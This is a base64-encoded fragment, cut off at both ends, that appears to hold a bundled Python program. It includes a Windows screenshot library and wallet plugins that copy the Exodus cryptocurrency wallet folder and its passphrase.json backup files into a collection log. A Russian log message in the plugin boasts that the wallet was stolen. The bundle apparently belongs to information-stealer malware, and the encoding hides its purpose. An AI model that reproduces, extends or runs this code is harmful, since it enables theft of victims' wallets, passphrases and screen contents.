W9uaXRvclsiaGVpZ2h0Il0gKiBtb25pdG9yWyJ3aWR0aCJdICogNCksXG4gICAgICAgICAgICApXG4gICAgICAgICAgICBkYXRhID0gYnl0ZWFycmF5KHJhd19kYXRhLmNvbnRlbnRzKVxuICAgICAgICBmaW5hbGx5OlxuICAgICAgICAgICAgIyBGcmVlXG4gICAgICAgICAgICBzZWxmLnhsaWIuWERlc3Ryb3lJbWFnZSh4aW1hZ2UpXG5cbiAgICAgICAgcmV0dXJuIHNlbGYuY2xzX2ltYWdlKGRhdGEsIG1vbml0b3IpXG4nKQogICAgX19zdGlja3l0YXBlX3dyaXRlX21vZHVsZSgnbXNzL3dpbmRvd3MucHknLCBiJyIiIlxuVGhpcyBpcyBwYXJ0IG9mIHRoZSBNU1MgUHl0aG9uXCdzIG1vZHVsZS5cblNvdXJjZTogaHR0cHM6Ly9naXRodWIuY29tL0JvYm9UaUcvcHl0aG9uLW1zc1xuIiIiXG5cbmltcG9ydCBzeXNcbmltcG9ydCBjdHlwZXNcbmltcG9ydCB0aHJlYWRpbmdcbmZyb20gY3R5cGVzIGltcG9ydCBQT0lOVEVSLCBTdHJ1Y3R1cmUsIFdJTkZVTkNUWVBFLCBjX3ZvaWRfcFxuZnJvbSBjdHlwZXMud2ludHlwZXMgaW1wb3J0IChcbiAgICBCT09MLFxuICAgIERPVUJMRSxcbiAgICBEV09SRCxcbiAgICBIQklUTUFQLFxuICAgIEhEQyxcbiAgICBIR0RJT0JKLFxuICAgIEhXTkQsXG4gICAgSU5ULFxuICAgIExPTkcsXG4gICAgTFBBUkFNLFxuICAgIFJFQ1QsXG4gICAgVUlOVCxcbiAgICBXT1JELFxuKVxuZnJvbSB0eXBpbmcgaW1wb3J0IFRZUEVfQ0hFQ0tJTkdcblxuZnJvbSAuYmFzZSBpbXBvcnQgTVNTQmFzZVxuZnJvbSAuZXhjZXB0aW9uIGltcG9ydCBTY3JlZW5TaG90RXJyb3JcblxuaWYgVFlQRV9DSEVDS0lORzpcbiAgICBmcm9tIHR5cGluZyBpbXBvcnQgQW55LCBEaWN0ICAjIG5vcWFcblxuICAgIGZyb20gLm1vZGVscyBpbXBvcnQgTW9uaXRvciwgTW9uaXRvcnMgICMgbm9xYVxuICAgIGZyb20gLnNjcmVlbnNob3QgaW1wb3J0IFNjcmVlblNob3QgICMgbm9xYVxuXG5fX2FsbF9fID0gKCJNU1MiLClcblxuXG5DQVBUVVJFQkxUID0gMHg0MDAwMDAwMFxuRElCX1JHQl9DT0xPUlMgPSAwXG5TUkNDT1BZID0gMHgwMENDMDAyMFxuXG5cbmNsYXNzIEJJVE1BUElORk9IRUFERVIoU3RydWN0dXJlKTpcbiAgICAiIiIgSW5mb3JtYXRpb24gYWJvdXQgdGhlIGRpbWVuc2lvbnMgYW5kIGNvbG9yIGZvcm1hdCBvZiBhIERJQi4gIiIiXG5cbiAgICBfZmllbGRzXyA9IFtcbiAgICAgICAgKCJiaVNpemUiLCBEV09SRCksXG4gICAgICAgICgiYmlXaWR0aCIsIExPTkcpLFxuICAgICAgICAoImJpSGVpZ2h0IiwgTE9ORyksXG4gICAgICAgICgiYmlQbGFuZXMiLCBXT1JEKSxcbiAgICAgICAgKCJiaUJpdENvdW50IiwgV09SRCksXG4gICAgICAgICgiYmlDb21wcmVzc2lvbiIsIERXT1JEKSxcbiAgICAgICAgKCJiaVNpemVJbWFnZSIsIERXT1JEKSxcbiAgICAgICAgKCJiaVhQZWxzUGVyTWV0ZXIiLCBMT05HKSxcbiAgICAgICAgKCJiaVlQZWxzUGVyTWV0ZXIiLCBMT05HKSxcbiAgICAgICAgKCJiaUNsclVzZWQiLCBEV09SRCksXG4gICAgICAgICgiYmlDbHJJbXBvcnRhbnQiLCBEV09SRCksXG4gICAgXVxuXG5cbmNsYXNzIEJJVE1BUElORk8oU3RydWN0dXJlKTpcbiAgICAiIiJcbiAgICBTdHJ1Y3R1cmUgdGhhdCBkZWZpbmVzIHRoZSBkaW1lbnNpb25zIGFuZCBjb2xvciBpbmZvcm1hdGlvbiBmb3IgYSBESUIuXG4gICAgIiIiXG5cbiAgICBfZmllbGRzXyA9IFsoImJtaUhlYWRlciIsIEJJVE1BUElORk9IRUFERVIpLCAoImJtaUNvbG9ycyIsIERXT1JEICogMyldXG5cblxuTU9OSVRPUk5VTVBST0MgPSBXSU5GVU5DVFlQRShJTlQsIERXT1JELCBEV09SRCwgUE9JTlRFUihSRUNUKSwgRE9VQkxFKVxuXG5cbiMgQyBmdW5jdGlvbnMgdGhhdCB3aWxsIGJlIGluaXRpYWxpc2VkIGxhdGVyLlxuI1xuIyBUaGlzIGlzIGEgZGljdDpcbiMgICAgY2Z1bmN0aW9uOiAoYXR0ciwgYXJndHlwZXMsIHJlc3R5cGUpXG4jXG4jIEF2YWlsYWJsZSBhdHRyOiBnZGkzMiwgdXNlcjMyLlxuI1xuIyBOb3RlOiBrZWVwIGl0IHNvcnRlZCBieSBjZnVuY3Rpb24uXG5DRlVOQ1RJT05TID0ge1xuICAgICJCaXRCbHQiOiAoImdkaTMyIiwgW0hEQywgSU5ULCBJTlQsIElOVCwgSU5ULCBIREMsIElOVCwgSU5ULCBEV09SRF0sIEJPT0wpLFxuICAgICJDcmVhdGVDb21wYXRpYmxlQml0bWFwIjogKCJnZGkzMiIsIFtIREMsIElOVCwgSU5UXSwgSEJJVE1BUCksXG4gICAgIkNyZWF0ZUNvbXBhdGlibGVEQyI6ICgiZ2RpMzIiLCBbSERDXSwgSERDKSxcbiAgICAiRGVsZXRlT2JqZWN0IjogKCJnZGkzMiIsIFtIR0RJT0JKXSwgSU5UKSxcbiAgICAiRW51bURpc3BsYXlNb25pdG9ycyI6ICgidXNlcjMyIiwgW0hEQywgY192b2lkX3AsIE1PTklUT1JOVU1QUk9DLCBMUEFSQU1dLCBCT09MKSxcbiAgICAiR2V0RGV2aWNlQ2FwcyI6ICgiZ2RpMzIiLCBbSFdORCwgSU5UXSwgSU5UKSxcbiAgICAiR2V0RElCaXRzIjogKFxuICAgICAgICAiZ2RpMzIiLFxuICAgICAgICBbSERDLCBIQklUTUFQLCBVSU5ULCBVSU5ULCBjX3ZvaWRfcCwgUE9JTlRFUihCSVRNQVBJTkZPKSwgVUlOVF0sXG4gICAgICAgIEJPT0wsXG4gICAgKSxcbiAgICAiR2V0U3lzdGVtTWV0cmljcyI6ICgidXNlcjMyIiwgW0lOVF0sIElOVCksXG4gICAgIkdldFdpbmRvd0RDIjogKCJ1c2VyMzIiLCBbSFdORF0sIEhEQyksXG4gICAgIlNlbGVjdE9iamVjdCI6ICgiZ2RpMzIiLCBbSERDLCBIR0RJT0JKXSwgSEdESU9CSiksXG59XG5cblxuY2xhc3MgTVNTKE1TU0Jhc2UpOlxuICAgICIiIiBNdWx0aXBsZSBTY3JlZW5TaG90cyBpbXBsZW1lbnRhdGlvbiBmb3IgTWljcm9zb2Z0IFdpbmRvd3MuICIiIlxuXG4gICAgX19zbG90c19fID0geyJfYmJveCIsICJfYm1pIiwgIl9kYXRhIiwgImdkaTMyIiwgInVzZXIzMiJ9XG5cbiAgICAjIENsYXNzIGF0dHJpYnV0ZXMgaW5zdGFuY2VkIG9uZSB0aW1lIHRvIHByZXZlbnQgcmVzb3VyY2UgbGVha3MuXG4gICAgYm1wID0gTm9uZVxuICAgIG1lbWRjID0gTm9uZVxuXG4gICAgIyBBIGRpY3QgdG8gbWFpbnRhaW4gKnNyY2RjKiB2YWx1ZXMgY3JlYXRlZCBieSBtdWx0aXBsZSB0aHJlYWRzLlxuICAgIF9zcmNkY19kaWN0ID0ge30gICMgdHlwZTogRGljdFt0aHJlYWRpbmcuVGhyZWFkLCBpbnRdXG5cbiAgICBkZWYgX19pbml0X18oc2VsZiwgKipfKTpcbiAgICAgICAgIyB0eXBlOiAoQW55KSAtPiBOb25lXG4gICAgICAgICIiIiBXaW5kb3dzIGluaXRpYWxpc2F0aW9ucy4gIiIiXG5cbiAgICAgICAgc3VwZXIoKS5fX2luaXRfXygpXG5cbiAgICAgICAgc2VsZi51c2VyMzIgPSBjdHlwZXMuV2luRExMKCJ1c2VyMzIiKVxuICAgICAgICBzZWxmLmdkaTMyID0gY3R5cGVzLldpbkRMTCgiZ2RpMzIiKVxuICAgICAgICBzZWxmLl9zZXRfY2Z1bmN0aW9ucygpXG4gICAgICAgIHNlbGYuX3NldF9kcGlfYXdhcmVuZXNzKClcblxuICAgICAgICBzZWxmLl9iYm94ID0geyJoZWlnaHQiOiAwLCAid2lkdGgiOiAwfVxuICAgICAgICBzZWxmLl9kYXRhID0gY3R5cGVzLmNyZWF0ZV9zdHJpbmdfYnVmZmVyKDApICAjIHR5cGU6IGN0eXBlcy5BcnJheVtjdHlwZXMuY19jaGFyXVxuXG4gICAgICAgIHNyY2RjID0gc2VsZi5fZ2V0X3NyY2RjKClcbiAgICAgICAgaWYgbm90IE1TUy5tZW1kYzpcbiAgICAgICAgICAgIE1TUy5tZW1kYyA9IHNlbGYuZ2RpMzIuQ3JlYXRlQ29tcGF0aWJsZURDKHNyY2RjKVxuXG4gICAgICAgIGJtaSA9IEJJVE1BUElORk8oKVxuICAgICAgICBibWkuYm1pSGVhZGVyLmJpU2l6ZSA9IGN0eXBlcy5zaXplb2YoQklUTUFQSU5GT0hFQURFUilcbiAgICAgICAgYm1pLmJtaUhlYWRlci5iaVBsYW5lcyA9IDEgICMgQWx3YXlzIDFcbiAgICAgICAgYm1pLmJtaUhlYWRlci5iaUJpdENvdW50ID0gMzIgICMgU2VlIGdyYWIuX19kb2NfXyBbMl1cbiAgICAgICAgYm1pLmJtaUhlYWRlci5iaUNvbXByZXNzaW9uID0gMCAgIyAwID0gQklfUkdCIChubyBjb21wcmVzc2lvbilcbiAgICAgICAgYm1pLmJtaUhlYWRlci5iaUNsclVzZWQgPSAwICAjIFNlZSBncmFiLl9fZG9jX18gWzNdXG4gICAgICAgIGJtaS5ibWlIZWFkZXIuYmlDbHJJbXBvcnRhbnQgPSAwICAjIFNlZSBncmFiLl9fZG9jX18gWzNdXG4gICAgICAgIHNlbGYuX2JtaSA9IGJtaVxuXG4gICAgZGVmIF9zZXRfY2Z1bmN0aW9ucyhzZWxmKTpcbiAgICAgICAgIiIiIFNldCBhbGwgY3R5cGVzIGZ1bmN0aW9ucyBhbmQgYXR0YWNoIHRoZW0gdG8gYXR0cmlidXRlcy4gIiIiXG5cbiAgICAgICAgY2ZhY3RvcnkgPSBzZWxmLl9jZmFjdG9yeVxuICAgICAgICBhdHRycyA9IHtcbiAgICAgICAgICAgICJnZGkzMiI6IHNlbGYuZ2RpMzIsXG4gICAgICAgICAgICAidXNlcjMyIjogc2VsZi51c2VyMzIsXG4gICAgICAgIH1cbiAgICAgICAgZm9yIGZ1bmMsIChhdHRyLCBhcmd0eXBlcywgcmVzdHlwZSkgaW4gQ0ZVTkNUSU9OUy5pdGVtcygpOlxuICAgICAgICAgICAgY2ZhY3RvcnkoXG4gICAgICAgICAgICAgICAgYXR0cj1hdHRyc1thdHRyXSxcbiAgICAgICAgICAgICAgICBmdW5jPWZ1bmMsXG4gICAgICAgICAgICAgICAgYXJndHlwZXM9YXJndHlwZXMsXG4gICAgICAgICAgICAgICAgcmVzdHlwZT1yZXN0eXBlLFxuICAgICAgICAgICAgKSAgIyB0eXBlOiBpZ25vcmVcblxuICAgIGRlZiBfc2V0X2RwaV9hd2FyZW5lc3Moc2VsZik6XG4gICAgICAgICIiIiBTZXQgRFBJIGF3YXJlIHRvIGNhcHR1cmUgZnVsbCBzY3JlZW4gb24gSGktRFBJIG1vbml0b3JzLiAiIiJcblxuICAgICAgICB2ZXJzaW9uID0gc3lzLmdldHdpbmRvd3N2ZXJzaW9uKClbOjJdICAjIHB5bGludDogZGlzYWJsZT1uby1tZW1iZXJcbiAgICAgICAgaWYgdmVyc2lvbiA+PSAoNiwgMyk6XG4gICAgICAgICAgICAjIFdpbmRvd3MgOC4xK1xuICAgICAgICAgICAgIyBIZXJlIDIgPSBQUk9DRVNTX1BFUl9NT05JVE9SX0RQSV9BV0FSRSwgd2hpY2ggbWVhbnM6XG4gICAgICAgICAgICAjICAgICBwZXIgbW9uaXRvciBEUEkgYXdhcmUuIFRoaXMgYXBwIGNoZWNrcyBmb3IgdGhlIERQSSB3aGVuIGl0IGlzXG4gICAgICAgICAgICAjICAgICBjcmVhdGVkIGFuZCBhZGp1c3RzIHRoZSBzY2FsZSBmYWN0b3Igd2hlbmV2ZXIgdGhlIERQSSBjaGFuZ2VzLlxuICAgICAgICAgICAgIyAgICAgVGhlc2UgYXBwbGljYXRpb25zIGFyZSBub3QgYXV0b21hdGljYWxseSBzY2FsZWQgYnkgdGhlIHN5c3RlbS5cbiAgICAgICAgICAgIGN0eXBlcy53aW5kbGwuc2hjb3JlLlNldFByb2Nlc3NEcGlBd2FyZW5lc3MoMilcbiAgICAgICAgZWxpZiAoNiwgMCkgPD0gdmVyc2lvbiA8ICg2LCAzKTpcbiAgICAgICAgICAgICMgV2luZG93cyBWaXN0YSwgNywgOCBhbmQgU2VydmVyIDIwMTJcbiAgICAgICAgICAgIHNlbGYudXNlcjMyLlNldFByb2Nlc3NEUElBd2FyZSgpXG5cbiAgICBkZWYgX2dldF9zcmNkYyhzZWxmKTpcbiAgICAgICAgIiIiXG4gICAgICAgIFJldHJpZXZlIGEgdGhyZWFkLXNhZmUgSERDIGZyb20gR2V0V2luZG93REMoKS5cbiAgICAgICAgSW4gbXVsdGl0aHJlYWRpbmcsIGlmIHRoZSB0aHJlYWQgd2hvIGNyZWF0ZXMgKnNyY2RjKiBpcyBkZWFkLCAqc3JjZGMqIHdpbGxcbiAgICAgICAgbm8gbG9uZ2VyIGJlIHZhbGlkIHRvIGdyYWIgdGhlIHNjcmVlbi4gVGhlICpzcmNkYyogYXR0cmlidXRlIGlzIHJlcGxhY2VkXG4gICAgICAgIHdpdGggKl9zcmNkY19kaWN0KiB0byBtYWludGFpbiB0aGUgKnNyY2RjKiB2YWx1ZXMgaW4gbXVsdGl0aHJlYWRpbmcuXG4gICAgICAgIFNpbmNlIHRoZSBjdXJyZW50IHRocmVhZCBhbmQgbWFpbiB0aHJlYWQgYXJlIGFsd2F5cyBhbGl2ZSwgcmV1c2UgdGhlaXIgKnNyY2RjKiB2YWx1ZSBmaXJzdC5cbiAgICAgICAgIiIiXG4gICAgICAgIGN1cl90aHJlYWQsIG1haW5fdGhyZWFkID0gdGhyZWFkaW5nLmN1cnJlbnRfdGhyZWFkKCksIHRocmVhZGluZy5tYWluX3RocmVhZCgpXG4gICAgICAgIHNyY2RjID0gTVNTLl9zcmNkY19kaWN0LmdldChjdXJfdGhyZWFkKSBvciBNU1MuX3NyY2RjX2RpY3QuZ2V0KG1haW5fdGhyZWFkKVxuICAgICAgICBpZiBub3Qgc3JjZGM6XG4gICAgICAgICAgICBzcmNkYyA9IE1TUy5fc3JjZGNfZGljdFtjdXJfdGhyZWFkXSA9IHNlbGYudXNlcjMyLkdldFdpbmRvd0RDKDApXG4gICAgICAgIHJldHVybiBzcmNkY1xuXG4gICAgZGVmIF9tb25pdG9yc19pbXBsKHNlbGYpOlxuICAgICAgICAjIHR5cGU6ICgpIC0+IE5vbmVcbiAgICAgICAgIiIiIEdldCBwb3NpdGlvbnMgb2YgbW9uaXRvcnMuIEl0IHdpbGwgcG9wdWxhdGUgc2VsZi5fbW9uaXRvcnMuICIiIlxuXG4gICAgICAgIGludF8gPSBpbnRcbiAgICAgICAgdXNlcjMyID0gc2VsZi51c2VyMzJcbiAgICAgICAgZ2V0X3N5c3RlbV9tZXRyaWNzID0gdXNlcjMyLkdldFN5c3RlbU1ldHJpY3NcblxuICAgICAgICAjIEFsbCBtb25pdG9yc1xuICAgICAgICBzZWxmLl9tb25pdG9ycy5hcHBlbmQoXG4gICAgICAgICAgICB7XG4gICAgICAgICAgICAgICAgImxlZnQiOiBpbnRfKGdldF9zeXN0ZW1fbWV0cmljcyg3NikpLCAgIyBTTV9YVklSVFVBTFNDUkVFTlxuICAgICAgICAgICAgICAgICJ0b3AiOiBpbnRfKGdldF9zeXN0ZW1fbWV0cmljcyg3NykpLCAgIyBTTV9ZVklSVFVBTFNDUkVFTlxuICAgICAgICAgICAgICAgICJ3aWR0aCI6IGludF8oZ2V0X3N5c3RlbV9tZXRyaWNzKDc4KSksICAjIFNNX0NYVklSVFVBTFNDUkVFTlxuICAgICAgICAgICAgICAgICJoZWlnaHQiOiBpbnRfKGdldF9zeXN0ZW1fbWV0cmljcyg3OSkpLCAgIyBTTV9DWVZJUlRVQUxTQ1JFRU5cbiAgICAgICAgICAgIH1cbiAgICAgICAgKVxuXG4gICAgICAgICMgRWFjaCBtb25pdG9yc1xuICAgICAgICBkZWYgX2NhbGxiYWNrKG1vbml0b3IsIGRhdGEsIHJlY3QsIGRjXyk6XG4gICAgICAgICAgICAjIHR5cGVzOiAoaW50LCBIREMsIExQUkVDVCwgTFBBUkFNKSAtPiBpbnRcbiAgICAgICAgICAgICIiIlxuICAgICAgICAgICAgQ2FsbGJhY2sgZm9yIG1vbml0b3JlbnVtcHJvYygpIGZ1bmN0aW9uLCBpdCB3aWxsIHJldHVyblxuICAgICAgICAgICAgYSBSRUNUIHdpdGggYXBwcm9wcmlhdGUgdmFsdWVzLlxuICAgICAgICAgICAgIiIiXG4gICAgICAgICAgICAjIHB5bGludDogZGlzYWJsZT11bnVzZWQtYXJndW1lbnRcblxuICAgICAgICAgICAgcmN0ID0gcmVjdC5jb250ZW50c1xuICAgICAgICAgICAgc2VsZi5fbW9uaXRvcnMuYXBwZW5kKFxuICAgICAgICAgICAgICAgIHtcbiAgICAgICAgICAgICAgICAgICAgImxlZnQiOiBpbnRfKHJjdC5sZWZ0KSxcbiAgICAgICAgICAgICAgICAgICAgInRvcCI6IGludF8ocmN0LnRvcCksXG4gICAgICAgICAgICAgICAgICAgICJ3aWR0aCI6IGludF8ocmN0LnJpZ2h0IC0gcmN0LmxlZnQpLFxuICAgICAgICAgICAgICAgICAgICAiaGVpZ2h0IjogaW50XyhyY3QuYm90dG9tIC0gcmN0LnRvcCksXG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgKVxuICAgICAgICAgICAgcmV0dXJuIDFcblxuICAgICAgICBjYWxsYmFjayA9IE1PTklUT1JOVU1QUk9DKF9jYWxsYmFjaylcbiAgICAgICAgdXNlcjMyLkVudW1EaXNwbGF5TW9uaXRvcnMoMCwgMCwgY2FsbGJhY2ssIDApXG5cbiAgICBkZWYgX2dyYWJfaW1wbChzZWxmLCBtb25pdG9yKTpcbiAgICAgICAgIyB0eXBlOiAoTW9uaXRvcikgLT4gU2NyZWVuU2hvdFxuICAgICAgICAiIiJcbiAgICAgICAgUmV0cmlldmUgYWxsIHBpeGVscyBmcm9tIGEgbW9uaXRvci4gUGl4ZWxzIGhhdmUgdG8gYmUgUkdCLlxuXG4gICAgICAgIEluIHRoZSBjb2RlLCB0aGVyZSBhcmUgZmV3IGludGVyZXN0aW5nIHRoaW5nczpcblxuICAgICAgICBbMV0gYm1pLmJtaUhlYWRlci5iaUhlaWdodCA9IC1oZWlnaHRcblxuICAgICAgICBBIGJvdHRvbS11cCBESUIgaXMgc3BlY2lmaWVkIGJ5IHNldHRpbmcgdGhlIGhlaWdodCB0byBhXG4gICAgICAgIHBvc2l0aXZlIG51bWJlciwgd2hpbGUgYSB0b3AtZG93biBESUIgaXMgc3BlY2lmaWVkIGJ5XG4gICAgICAgIHNldHRpbmcgdGhlIGhlaWdodCB0byBhIG5lZ2F0aXZlIG51bWJlci5cbiAgICAgICAgaHR0cHM6Ly9tc2RuLm1pY3Jvc29mdC5jb20vZW4tdXMvbGlicmFyeS9tczc4Nzc5Ni5hc3B4XG4gICAgICAgIGh0dHBzOi8vbXNkbi5taWNyb3NvZnQuY29tL2VuLXVzL2xpYnJhcnkvZGQxNDQ4NzklMjh2PXZzLjg1JTI5LmFzcHhcblxuXG4gICAgICAgIFsyXSBibWkuYm1pSGVhZGVyLmJpQml0Q291bnQgPSAzMlxuICAgICAgICAgICAgaW1hZ2VfZGF0YSA9IGNyZWF0ZV9zdHJpbmdfYnVmZmVyKGhlaWdodCAqIHdpZHRoICogNClcblxuICAgICAgICBXZSBncmFiIHRoZSBpbWFnZSBpbiBSR0JYIG1vZGUsIHNvIHRoYXQgZWFjaCB3b3JkIGlzIDMyYml0XG4gICAgICAgIGFuZCB3ZSBoYXZlIG5vIHN0cmlkaW5nLlxuICAgICAgICBJbnNwaXJlZCBieSBodHRwczovL2dpdGh1Yi5jb20vem9vZklPL2ZsZXh4XG5cblxuICAgICAgICBbM10gYm1pLmJtaUhlYWRlci5iaUNsclVzZWQgPSAwXG4gICAgICAgICAgICBibWkuYm1pSGVhZGVyLmJpQ2xySW1wb3J0YW50ID0gMFxuXG4gICAgICAgIFdoZW4gYmlDbHJVc2VkIGFuZCBiaUNsckltcG9ydGFudCBhcmUgc2V0IHRvIHplcm8sIHRoZXJlXG4gICAgICAgIGlzICJubyIgY29sb3IgdGFibGUsIHNvIHdlIGNhbiByZWFkIHRoZSBwaXhlbHMgb2YgdGhlIGJpdG1hcFxuICAgICAgICByZXRyaWV2ZWQgYnkgZ2RpMzIuR2V0RElCaXRzKCkgYXMgYSBzZXF1ZW5jZSBvZiBSR0IgdmFsdWVzLlxuICAgICAgICBUaGFua3MgdG8gaHR0cDovL3N0YWNrb3ZlcmZsb3cuY29tL2EvMzY4ODY4MlxuICAgICAgICAiIiJcblxuICAgICAgICBzcmNkYywgbWVtZGMgPSBzZWxmLl9nZXRfc3JjZGMoKSwgTVNTLm1lbWRjXG4gICAgICAgIHdpZHRoLCBoZWlnaHQgPSBtb25pdG9yWyJ3aWR0aCJdLCBtb25pdG9yWyJoZWlnaHQiXVxuXG4gICAgICAgIGlmIChzZWxmLl9iYm94WyJoZWlnaHQiXSwgc2VsZi5fYmJveFsid2lkdGgiXSkgIT0gKGhlaWdodCwgd2lkdGgpOlxuICAgICAgICAgICAgc2VsZi5fYmJveCA9IG1vbml0b3JcbiAgICAgICAgICAgIHNlbGYuX2JtaS5ibWlIZWFkZXIuYmlXaWR0aCA9IHdpZHRoXG4gICAgICAgICAgICBzZWxmLl9ibWkuYm1pSGVhZGVyLmJpSGVpZ2h0ID0gLWhlaWdodCAgIyBXaHkgbWludXM/IFsxXVxuICAgICAgICAgICAgc2VsZi5fZGF0YSA9IGN0eXBlcy5jcmVhdGVfc3RyaW5nX2J1ZmZlcih3aWR0aCAqIGhlaWdodCAqIDQpICAjIFsyXVxuICAgICAgICAgICAgaWYgTVNTLmJtcDpcbiAgICAgICAgICAgICAgICBzZWxmLmdkaTMyLkRlbGV0ZU9iamVjdChNU1MuYm1wKVxuICAgICAgICAgICAgTVNTLmJtcCA9IHNlbGYuZ2RpMzIuQ3JlYXRlQ29tcGF0aWJsZUJpdG1hcChzcmNkYywgd2lkdGgsIGhlaWdodClcbiAgICAgICAgICAgIHNlbGYuZ2RpMzIuU2VsZWN0T2JqZWN0KG1lbWRjLCBNU1MuYm1wKVxuXG4gICAgICAgIHNlbGYuZ2RpMzIuQml0Qmx0KFxuICAgICAgICAgICAgbWVtZGMsXG4gICAgICAgICAgICAwLFxuICAgICAgICAgICAgMCxcbiAgICAgICAgICAgIHdpZHRoLFxuICAgICAgICAgICAgaGVpZ2h0LFxuICAgICAgICAgICAgc3JjZGMsXG4gICAgICAgICAgICBtb25pdG9yWyJsZWZ0Il0sXG4gICAgICAgICAgICBtb25pdG9yWyJ0b3AiXSxcbiAgICAgICAgICAgIFNSQ0NPUFkgfCBDQVBUVVJFQkxULFxuICAgICAgICApXG4gICAgICAgIGJpdHMgPSBzZWxmLmdkaTMyLkdldERJQml0cyhcbiAgICAgICAgICAgIG1lbWRjLCBNU1MuYm1wLCAwLCBoZWlnaHQsIHNlbGYuX2RhdGEsIHNlbGYuX2JtaSwgRElCX1JHQl9DT0xPUlNcbiAgICAgICAgKVxuICAgICAgICBpZiBiaXRzICE9IGhlaWdodDpcbiAgICAgICAgICAgIHJhaXNlIFNjcmVlblNob3RFcnJvcigiZ2RpMzIuR2V0RElCaXRzKCkgZmFpbGVkLiIpXG5cbiAgICAgICAgcmV0dXJuIHNlbGYuY2xzX2ltYWdlKGJ5dGVhcnJheShzZWxmLl9kYXRhKSwgbW9uaXRvcilcbicpCiAgICBfX3N0aWNreXRhcGVfd3JpdGVfbW9kdWxlKCdwbHVnaW5zL3dhbGxldHMvX19pbml0X18ucHknLCBiJ2Zyb20gLmV4b2R1cyBpbXBvcnQgRXhvZHVzJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ3BsdWdpbnMvd2FsbGV0cy9leG9kdXMucHknLCBiJ2Zyb20gcGx1Z2lucyBpbXBvcnQgUGx1Z2luXHJcbmZyb20gY29uZmlnIGltcG9ydCBDb25maWdcclxuZnJvbSBvcy5wYXRoIGltcG9ydCBpc2Rpciwgam9pblxyXG5mcm9tIG9zIGltcG9ydCBta2Rpciwgd2Fsa1xyXG5mcm9tIHNlY3JldHMgaW1wb3J0IHRva2VuX2hleFxyXG5mcm9tIHRvb2xzIGltcG9ydCBjb3B5dHJlZSwgY29weWZpbGVcclxuXHJcblxyXG5cclxuY2xhc3MgRXhvZHVzKFBsdWdpbik6XHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgY29uZjogQ29uZmlnKSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYuY29uZiA9IGNvbmZcclxuXHJcblxyXG4gICAgYXN5bmMgZGVmIGNhbGxiYWNrKHNlbGYsIHBhdGg6IHN0cikgLT4gTm9uZTpcclxuICAgICAgICBpZiBub3QgaXNkaXIocGF0aCk6XHJcbiAgICAgICAgICAgIHJldHVyblxyXG5cclxuICAgICAgICB3YWxsZXRzX3BhdGggPSBqb2luKHNlbGYuY29uZi5sb2dfcGF0aCwgXCd3YWxsZXRzXCcpXHJcbiAgICAgICAgaWYgbm90IGlzZGlyKHdhbGxldHNfcGF0aCk6XHJcbiAgICAgICAgICAgIG1rZGlyKHdhbGxldHNfcGF0aClcclxuICAgICAgICBcclxuICAgICAgICBsb2dfZXhvZHVzX3BhdGggPSBqb2luKHdhbGxldHNfcGF0aCwgZlwnZXhvZHVzX3t0b2tlbl9oZXgoNCl9XCcpXHJcblxyXG4gICAgICAgIHdhbGxldF9mb2xkZXIgPSBqb2luKHBhdGgsIFwnZXhvZHVzLndhbGxldFwnKVxyXG4gICAgICAgIGlmIGlzZGlyKHdhbGxldF9mb2xkZXIpOlxyXG4gICAgICAgICAgICBhd2FpdCBjb3B5dHJlZSh3YWxsZXRfZm9sZGVyLCBsb2dfZXhvZHVzX3BhdGgpXHJcbiAgICAgICAgICAgIFxyXG4gICAgICAgICAgICBhd2FpdCBzZWxmLmNvbmYubG9nZ2VyLmxvZyhmXCdceGQwXHhhMVx4ZDBceGJmXHhkMFx4YjhceGQwXHhiN1x4ZDBceGI2XHhkMFx4YjVceGQwXHhiZCBleG9kdXMgXHhkMVx4ODEge3BhdGh9XCcpXHJcblxyXG4gICAgICAgIGJhY3VrcHNfZm9sZGVyID0gam9pbihwYXRoLCBcJ2JhY2t1cHNcJylcclxuICAgICAgICBmb3IgZGlycGF0aCwgZGlybmFtZXMsIGZpbGVuYW1lcyBpbiB3YWxrKGJhY3VrcHNfZm9sZGVyKTpcclxuICAgICAgICAgICAgZm9yIGYgaW4gZmlsZW5hbWVzOlxyXG4gICAgICAgICAgICAgICAgaWYgZiA9PSAicGFzc3BocmFzZS5qc29uIjpcclxuICAgICAgICAgICAgICAgICAgICBpZiBub3QgaXNkaXIobG9nX2V4b2R1c19wYXRoKTpcclxuICAgICAgICAgICAgICAgICAgICAgICAgbWtkaXIobG9nX2V4b2R1c19wYXRoKVxyXG4gICAgICAgICAgICAgICAgICAgIFxyXG4gICAgICAgICAgICAgICAgICAgIGF3YWl0IGNvcHlmaWxlKGpvaW4oZGlycGF0aCwgZiksIGpvaW4obG9nX2V4b2R1c19wYXRoLCBmXCdwYXNzcGhyYXNlX3t0b2tlbl9oZXgoNCl9Lmpzb25cJykpJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ3BsdWdpbnMvd2FsbGV0cy9FeG9kdXMucHknLCBiJ2Zyb20gcGx1Z2lucyBpbXBvcnQgUGx1Z2luXHJcbmZyb20gY29uZmlnIGltcG9ydCBDb25maWdcclxuZnJvbSBvcy5wYXRoIGltcG9ydCBpc2Rpciwgam9pblxyXG5mcm9tIG9zIGltcG9ydCBta2Rpciwgd2Fsa1xyXG5mcm9tIHNlY3JldHMgaW1wb3J0IHRva2VuX2hleFxyXG5mcm9tIHRvb2xzIGltcG9ydCBjb3B5dHJlZSwgY29weWZpbGVcclxuXHJcblxyXG5cclxuY2xhc3MgRXhvZHVzKFBsdWdpbik6XHJcbiAgICBkZWYgX19pbml0X18oc2VsZiwgY29uZjogQ29uZmlnKSAtPiBOb25lOlxyXG4gICAgICAgIHNlbGYuY29uZiA9IGNvbmZcclxuXHJcblxyXG4gICAgYXN5bmMgZGVmIGNhbGxiYWNrKHNlbGYsIHBhdGg6IHN0cikgLT4gTm9uZTpcclxuICAgICAgICBpZiBub3QgaXNkaXIocGF0aCk6XHJcbiAgICAgICAgICAgIHJldHVyblxyXG5cclxuICAgICAgICB3YWxsZXRzX3BhdGggPSBqb2luKHNlbGYuY29uZi5sb2dfcGF0aCwgXCd3YWxsZXRzXCcpXHJcbiAgICAgICAgaWYgbm90IGlzZGlyKHdhbGxldHNfcGF0aCk6XHJcbiAgICAgICAgICAgIG1rZGlyKHdhbGxldHNfcGF0aClcclxuICAgICAgICBcclxuICAgICAgICBsb2dfZXhvZHVzX3BhdGggPSB